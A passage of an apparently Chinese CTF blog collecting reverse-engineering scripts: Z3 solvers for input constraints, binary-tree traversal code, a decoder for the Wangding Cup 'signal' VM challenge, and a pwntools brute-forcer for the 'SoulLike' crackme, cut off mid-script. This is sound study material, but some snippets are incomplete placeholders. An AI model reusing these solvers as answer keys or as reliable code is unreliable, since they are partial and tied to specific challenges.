class="keyword">in</span> input_chars:</span><br><span class="line">    solver.add(And(char &gt;= <span class="number">0</span>, char &lt;= <span class="number">127</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR adjacent characters and store results in code</span></span><br><span class="line">code = [input_chars[i] ^ input_chars[i + <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)] + [input_chars[<span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract variables a1 to a14 as described in the problem statement</span></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = [code[i] <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the constraints as provided in the original code</span></span><br><span class="line">constraints = [</span><br><span class="line">    ((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>),</span><br><span class="line">    ((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>),</span><br><span class="line">    ((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>),</span><br><span class="line">    ((((a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">37136</span>),</span><br><span class="line">    (((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>),</span><br><span class="line">    ((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>),</span><br><span class="line">    ((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>),</span><br><span class="line">    (((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>),</span><br><span class="line">    ((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>),</span><br><span class="line">    (((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>),</span><br><span class="line">    ((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>),</span><br><span class="line">    ((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>),</span><br><span class="line">    (((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>),</span><br><span class="line">    (((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add all constraints to the solver</span></span><br><span class="line"><span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">    solver.add(constraint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if there is a solution</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    <span class="comment"># Convert the solution back into a string</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model.evaluate(input_chars[i]).as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Solution:&#x27;</span>, solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第三种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&quot;l%d&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.add(i&gt;<span class="number">0</span>)</span><br><span class="line">    s.add(i&lt;<span class="number">255</span>)</span><br><span class="line">..............(s.add());</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span>%(m[l[i]]))),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="使用前序中序求后续遍历-使用中序后序求前序遍历"><a href="#使用前序中序求后续遍历-使用中序后序求前序遍历" class="headerlink" title="使用前序中序求后续遍历-使用中序后序求前序遍历"></a>使用前序中序求后续遍历-使用中序后序求前序遍历</h2><h3 id="使用前序中序求后续遍历"><a href="#使用前序中序求后续遍历" class="headerlink" title="使用前序中序求后续遍历"></a>使用前序中序求后续遍历</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="variable language_">self</span>.val = x</span><br><span class="line">        <span class="variable language_">self</span>.left = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.right = <span class="literal">None</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># 返回构造的TreeNode根节点</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reConstructBinaryTree</span>(<span class="params">self, pre, tin</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(pre)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root=TreeNode(pre[<span class="number">0</span>])</span><br><span class="line">        TinIndex=tin.index(pre[<span class="number">0</span>])</span><br><span class="line">        root.left=<span class="variable language_">self</span>.reConstructBinaryTree(pre[<span class="number">1</span>:TinIndex+<span class="number">1</span>], tin[<span class="number">0</span>:TinIndex])</span><br><span class="line">        root.right=<span class="variable language_">self</span>.reConstructBinaryTree(pre[TinIndex+<span class="number">1</span>:], tin[TinIndex+<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PostTraversal</span>(<span class="params">self,root</span>):  <span class="comment">#后序遍历</span></span><br><span class="line">        <span class="keyword">if</span> root != <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.PostTraversal(root.left)</span><br><span class="line">            <span class="variable language_">self</span>.PostTraversal(root.right)</span><br><span class="line">            <span class="built_in">print</span>(root.val)</span><br><span class="line">pre=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line">tin=[<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>]</span><br><span class="line">S=Solution()</span><br><span class="line">root=S.reConstructBinaryTree(pre,tin)</span><br><span class="line">S.PostTraversal(root)</span><br></pre></td></tr></table></figure>

<h3 id="使用中序后序求前序遍历"><a href="#使用中序后序求前序遍历" class="headerlink" title="使用中序后序求前序遍历"></a>使用中序后序求前序遍历</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="variable language_">self</span>.val=x</span><br><span class="line">        <span class="variable language_">self</span>.left=<span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.right=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reConstructBinaryTree</span>(<span class="params">self,post,tin</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(post)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root=TreeNode(post[-<span class="number">1</span>])</span><br><span class="line">        TinIndex=tin.index(post[-<span class="number">1</span>])</span><br><span class="line">        root.left=<span class="variable language_">self</span>.reConstructBinaryTree(post[<span class="number">0</span>:TinIndex],tin[<span class="number">0</span>:TinIndex])</span><br><span class="line">        root.right=<span class="variable language_">self</span>.reConstructBinaryTree(post[TinIndex:<span class="built_in">len</span>(post)-<span class="number">1</span>],tin[TinIndex+<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PreTraversal</span>(<span class="params">self,root</span>):</span><br><span class="line">        <span class="keyword">if</span> root !=<span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(root.val，end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.PreTraversal(root.left)</span><br><span class="line">            <span class="variable language_">self</span>.PreTraversal(root.right)</span><br><span class="line"></span><br><span class="line">post =[<span class="number">7</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">tin  =[<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>]</span><br><span class="line">pre  =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">S=Solution()</span><br><span class="line">root=S.reConstructBinaryTree(post,tin)</span><br><span class="line">S.PreTraversal(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="网鼎杯signal"><a href="#网鼎杯signal" class="headerlink" title="网鼎杯signal"></a>网鼎杯signal</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a1=[]</span><br><span class="line">v4=[<span class="number">10</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">167</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">7</span>, <span class="number">132</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">122</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(v4)):</span><br><span class="line">          <span class="keyword">if</span> v4[i]==<span class="number">7</span>:</span><br><span class="line">                    a1.append(v4[i+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#print(a1)</span></span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">34</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">49</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">122</span>]</span><br><span class="line">a1.reverse()</span><br><span class="line">v4.reverse()</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">us = <span class="number">0</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v4)):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(v4) - <span class="number">1</span>:</span><br><span class="line">        flag.append(us)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">1</span> <span class="keyword">and</span> v4[i - <span class="number">1</span>] != <span class="number">1</span>:</span><br><span class="line">        v5 = a1[v9]</span><br><span class="line">        v9 += <span class="number">1</span></span><br><span class="line">        flag.append(us)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> (v4[i + <span class="number">1</span>] != <span class="number">3</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">4</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">5</span>):</span><br><span class="line">            us = v5 - v4[i - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(us,v5,a[i-1])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> (v4[i + <span class="number">1</span>] != <span class="number">2</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">4</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">5</span>):</span><br><span class="line">            us = v5 + v4[i - <span class="number">1</span>]  <span class="comment"># LOBYTE是al有8位，参与运算的5、33、32是全值，所以LOBYTE可省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> (v4[i + <span class="number">1</span>] != <span class="number">3</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">2</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">5</span>):</span><br><span class="line">            us = v5 ^ v4[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> (v4[i + <span class="number">1</span>] != <span class="number">3</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">4</span> <span class="keyword">and</span> v4[i + <span class="number">1</span>] != <span class="number">2</span>):</span><br><span class="line">            us = <span class="built_in">int</span>(v5 / v4[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">8</span>:</span><br><span class="line">        v5 = us</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">11</span>:</span><br><span class="line">        us = v5 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v4[i] == <span class="number">12</span>:</span><br><span class="line">        us = v5 - <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(&quot;12:&quot;,us)</span></span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> flag:</span><br><span class="line">    out += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + out + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="爆破脚本（SoulLike）"><a href="#爆破脚本（SoulLike）" class="headerlink" title="爆破脚本（SoulLike）"></a>爆破脚本（SoulLike）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">T = [<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;\x03&#x27;</span>, <span class="string">&#x27;\x04&#x27;</span>, <span class="string">&#x27;\x05&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x07&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0c&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x0e&#x27;</span>, <span class="string">&#x27;\x0f&#x27;</span>, <span class="string">&#x27;\x10&#x27;</span>, <span class="string">&#x27;\x11&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;\x15&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>, <span class="string">&#x27;\x17&#x27;</span>, <span class="string">&#x27;\x18&#x27;</span>, <span class="string">&#x27;\x19&#x27;</span>, <span class="string">&#x27;\x1a&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;\x1c&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;\x7f&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">a = <span class="string">&#x27;actf&#123;&#x27;</span></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line">pty = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> T:</span><br><span class="line">        io = process(<span class="string">&#x27;./SoulLike&#x27;</span>)     </span><br><span class="line">        flag = a + i</span><br><span class="line">        flag = flag.ljust(<span class="number">17</span>,<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        success(flag)</span><br><span class="line">        io.sendline(flag)      </span><br><span class="line">        io.recvuntil(<span class="string">&#x27;#&#x27;</span>)      </span><br><span class="line">        <span class="keyword">if</span> b &lt; <span class="number">9</span> :</span><br><span class="line">            n = <span class="built_in">int</span>(io.recv(<span class="number">1</span>)) </span><br><span 